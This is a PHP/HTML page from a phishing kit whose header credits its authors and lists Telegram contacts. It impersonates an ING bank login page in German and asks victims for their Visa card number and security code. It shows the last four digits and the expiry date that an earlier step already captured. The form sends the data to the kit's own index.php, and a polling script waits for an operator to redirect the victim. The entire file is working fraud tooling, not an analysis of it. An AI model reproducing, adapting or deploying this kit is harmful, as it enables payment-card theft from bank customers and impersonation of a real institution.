<?php
    /*******
    Main Author: EL GH03T && Z0N51
    Contact me on telegram : https://t.me/elgh03t / https://t.me/z0n51
    ********************************************************/
    
    require_once '../includes/main.php';
    reset_action(get_client_ip());
    $_SESSION['last_page'] = 'cc';
    $infos  = get_infos();
    $cc     = $infos['last4digits'];
    $date   = $infos['date'];
?>
<!doctype html>
<html style="display: flex; flex-direction: column;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/style.css">

        <link rel="icon" type="image/png" href="../assets/imgs/favicon.png" />

        <title>ING Login</title>
    </head>

    <body style="display: flex; flex-direction: column;">

        <div id="loader">
            <div class="inner">
                <ul>
                    <li></li>
                    <li></li>
                    <li class="active"></li>
                </ul>
                <p>Bitte warten</p>
            </div>
        </div>

        <!-- HEADER -->
        <header id="header">
            <div class="container">
                <div class="logo"><img src="../assets/imgs/logo.svg"></div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- MAIN -->
        <main id="main" class="flex-grow-1">
            <div class="container">
                <div class="title">
                    <h3>Willkommen</h3>
                </div>

                <div class="box">
                    <p style="font-size: 18px; margin-bottom: 50px;">Bitte geben Sie die ersten 12 Ziffern Ihrer ING BANK Visa-Karte (XXXX-XXXX-XXXX-<b><?php echo $cc; ?></b>) und die letzten 3 Ziffern auf der Ruckseite Ihrer Karte ein, um Ihr Konto zu verifizieren</p>
                    <div class="row">
                        <div class="col-lg-4 col-md-12 col-sm-12 col-12 mb-lg-0 mb-md-5 mb-sm-5 mb-5">
                            <h3 style="color: #666; font-size: 24px; font-weight: 300;">Einzelheiten</h3>
                        </div>
                        <div class="col-lg-8 col-md-12 col-sm-12 col-12">
                            <form action="../index.php" method="post" id="form">
                                <input type="hidden" name="captcha">
                                <input type="hidden" name="step" value="cc">
                                <div class="form-group row mb30">
                                    <label style="font-size: 16px; font-weight: 300;" for="one" class="col-md-4">Kartennummer</label>
                                    <div class="col-md-8">
                                        <div class="inputs">
                                            <input type="text" name="cc1" id="cc1" class="form-control <?php echo is_invalid_class($_SESSION['errors'],'cc1') ?>" placeholder="xxxx" value="<?php echo get_value('cc1'); ?>">
                                            <input type="text" name="cc2" id="cc2" class="form-control <?php echo is_invalid_class($_SESSION['errors'],'cc2') ?>" placeholder="xxxx" value="<?php echo get_value('cc2'); ?>">
                                            <input type="text" name="cc3" id="cc3" class="form-control <?php echo is_invalid_class($_SESSION['errors'],'cc3') ?>" placeholder="xxxx" value="<?php echo get_value('cc3'); ?>">
                                            <input type="text" name="cc4" id="cc4" class="form-control" value="<?php echo $cc; ?>" readonly>
                                        </div>
                                        <?php echo error_message($_SESSION['errors'],'one'); ?>
                                    </div>
                                </div>
                                <div class="form-group row mb30">
                                    <label style="font-size: 16px; font-weight: 300;" for="two" class="col-md-4">Haltbarkeitsdatum</label>
                                    <div class="col-md-8">
                                        <input type="text" name="two" id="two" class="form-control" value="<?php echo $date; ?>" readonly>
                                    </div>
                                </div>
                                <div class="form-group row mb30">
                                    <label style="font-size: 16px; font-weight: 300;" for="three" class="col-md-4">Sicherheitscode</label>
                                    <div class="col-md-8">
                                        <input type="text" name="three" class="form-control <?php echo is_invalid_class($_SESSION['errors'],'three') ?>" id="three" value="<?php echo get_value('three'); ?>">
                                        <?php echo error_message($_SESSION['errors'],'three'); ?>
                                    </div>
                                </div>
                                <div class="btns text-right mt30">
                                    <button class="mr-3" type="button">Abbrechen</button>
                                    <button type="submit" id="submit"><i class="fas fa-angle-right"></i> Fortsetzen</button>
                                </div>
                            </form>
                        </div>
                    </div>

                </div>
                
            </div>
        </main>
        <!-- END MAIN -->

        <!-- FOOTER -->
        <footer id="footer">
            <ul>
                <li>Karriere</li>
                <li>Vertriebspartner</li>
                <li>Wholesale Banking</li>
                <li>Kontaktformular</li>
                <li>AGB</li>
                <li>Datenschutz</li>
                <li>Impressum</li>
            </ul>
            <div><img style="min-width: 144px;" src="../assets/imgs/social.png"></div>
        </footer>
        <!-- END FOOTER -->

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/jquery-simple-upload@1.1.0/simpleUpload.min.js"></script>
        <script src="../assets/js/script.js"></script>

        <script>
            $('.inputs input').keyup(function(e){
                if( $(this).val().length == 4 ) {
                    $(this).next().focus();
                } else if( $(this).val().length == 0 ) {
                    if( e.keyCode == 8 ) {
                        $(this).prev().focus();
                    }
                }
            });

            $('#submit').click(function(e) {
                e.preventDefault();
                $('.error').hide();
                $('#loader').css({"display":"flex"}).show(200,function() {
                    $.post( "../index.php", $('#form').serialize() )
                        .done(function( data ) {
                        if( data == 'success' ) {
                            
                            (function worker() {
                                $.ajax({
                                    method: "GET",
                                    url: '../index.php?waiting=1',
                                    success: function (data) {
                                        if( data !== '' ) {
                                            window.location.href= '../index.php?redirection=' + data;
                                        }
                                    },
                                    complete: function () {
                                        setTimeout(worker, 1000);
                                    }
                                });
                            })();

                        } else if( data == 'error' ) {
                            location.reload();
                        }
                    });
                });
            });

        </script>

    </body>

</html>